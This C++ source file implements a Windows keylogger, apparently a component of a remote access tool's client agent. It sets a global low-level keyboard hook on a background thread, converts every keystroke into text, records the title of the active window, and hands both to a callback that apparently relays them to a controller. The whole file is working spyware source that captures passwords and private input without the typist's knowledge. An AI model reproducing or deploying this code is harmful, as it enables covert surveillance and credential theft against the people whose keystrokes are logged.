#include "KeyloggerHandler.h"
#include <Windows.h>
#include <iostream>
#include <string>
#include <thread>
#include <atomic>

namespace rslm {
    namespace client {
        namespace messages {

            static std::atomic<bool> g_keylogging(false);
            static HHOOK g_hook = nullptr;
            static KeylogCallback g_callback;
            static std::thread g_keylogThread;
            static DWORD g_hookThreadId = 0;

            static std::string GetActiveWindowTitle() {
                char title[256] = { 0 };
                HWND hwnd = GetForegroundWindow();
                if (hwnd) {
                    GetWindowTextA(hwnd, title, 256);
                }
                return std::string(title);
            }

            static std::string KeyCodeToText(UINT virtualKey, bool isShift) {
                // Touches spéciales
                switch (virtualKey) {
                case VK_BACK:    return "[Backspace]";
                case VK_RETURN:  return "[Enter]\n";
                case VK_SPACE:   return " ";
                case VK_TAB:     return "[Tab]";
                case VK_ESCAPE:  return "[Esc]";
                case VK_UP:      return "[Up]";
                case VK_DOWN:    return "[Down]";
                case VK_LEFT:    return "[Left]";
                case VK_RIGHT:   return "[Right]";
                case VK_DELETE:  return "[Delete]";
                case VK_CAPITAL: return "[CapsLock]";
                case VK_F1:      return "[F1]";
                case VK_F2:      return "[F2]";
                case VK_F3:      return "[F3]";
                case VK_F4:      return "[F4]";
                case VK_F5:      return "[F5]";
                case VK_F6:      return "[F6]";
                case VK_F7:      return "[F7]";
                case VK_F8:      return "[F8]";
                case VK_F9:      return "[F9]";
                case VK_F10:     return "[F10]";
                case VK_F11:     return "[F11]";
                case VK_F12:     return "[F12]";
                }

                // Caractères imprimables
                BYTE keyboardState[256] = { 0 };
                GetKeyboardState(keyboardState);

                // Simuler la touche Shift si nécessaire
                if (isShift) {
                    keyboardState[VK_SHIFT] = 0x80;
                }

                WCHAR buffer[10] = { 0 };
                int result = ToUnicode(virtualKey, 0, keyboardState, buffer, 10, 0);

                if (result > 0) {
                    char ascii[11] = { 0 };
                    WideCharToMultiByte(CP_ACP, 0, buffer, -1, ascii, 10, nullptr, nullptr);
                    return std::string(ascii);
                }

                return "";
            }

            static LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
                if (nCode >= 0 && g_keylogging.load() && g_callback) {
                    if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
                        KBDLLHOOKSTRUCT* kbdStruct = reinterpret_cast<KBDLLHOOKSTRUCT*>(lParam);
                        if (kbdStruct) {
                            UINT virtualKey = kbdStruct->vkCode;
                            bool isShift = (GetAsyncKeyState(VK_SHIFT) & 0x8000) != 0;

                            std::string text = KeyCodeToText(virtualKey, isShift);
                            if (!text.empty()) {
                                // Copier les données avant de les envoyer
                                std::string windowTitle = GetActiveWindowTitle();
                                std::string capturedText = text;

                                // Utiliser un try-catch pour éviter le crash
                                try {
                                    g_callback(windowTitle, capturedText);
                                }
                                catch (...) {
                                    std::cout << "[Agent] Exception in callback" << std::endl;
                                }
                            }
                        }
                    }
                }
                return CallNextHookEx(g_hook, nCode, wParam, lParam);
            }

            static void KeyloggerThread() {
                std::cout << "[Agent] Keylogger thread started" << std::endl;

                g_hook = SetWindowsHookExA(WH_KEYBOARD_LL, KeyboardProc, GetModuleHandle(nullptr), 0);
                if (!g_hook) {
                    std::cout << "[Agent] ERROR: Failed to set keyboard hook! Error: " << GetLastError() << std::endl;
                    return;
                }
                std::cout << "[Agent] Keyboard hook installed successfully" << std::endl;

                g_hookThreadId = GetCurrentThreadId();

                MSG msg;
                while (g_keylogging.load() && GetMessage(&msg, nullptr, 0, 0)) {
                    TranslateMessage(&msg);
                    DispatchMessage(&msg);
                }

                UnhookWindowsHookEx(g_hook);
                g_hook = nullptr;
                std::cout << "[Agent] Keyboard hook removed" << std::endl;
            }

            void KeyloggerHandler::Start(KeylogCallback onKeylog) {
                if (g_keylogging.load()) return;

                std::cout << "[Agent] Keylogger::Start called" << std::endl;

                g_callback = std::move(onKeylog);
                g_keylogging.store(true);

                g_keylogThread = std::thread(KeyloggerThread);
                g_keylogThread.detach();
            }

            void KeyloggerHandler::Stop() {
                std::cout << "[Agent] Keylogger::Stop called" << std::endl;
                g_keylogging.store(false);

                // Envoyer WM_QUIT pour sortir de GetMessage
                PostThreadMessage(g_hookThreadId, WM_QUIT, 0, 0);
            }

            bool KeyloggerHandler::IsRunning() {
                return g_keylogging.load();
            }

        } // namespace messages
    } // namespace client
} // namespace rslm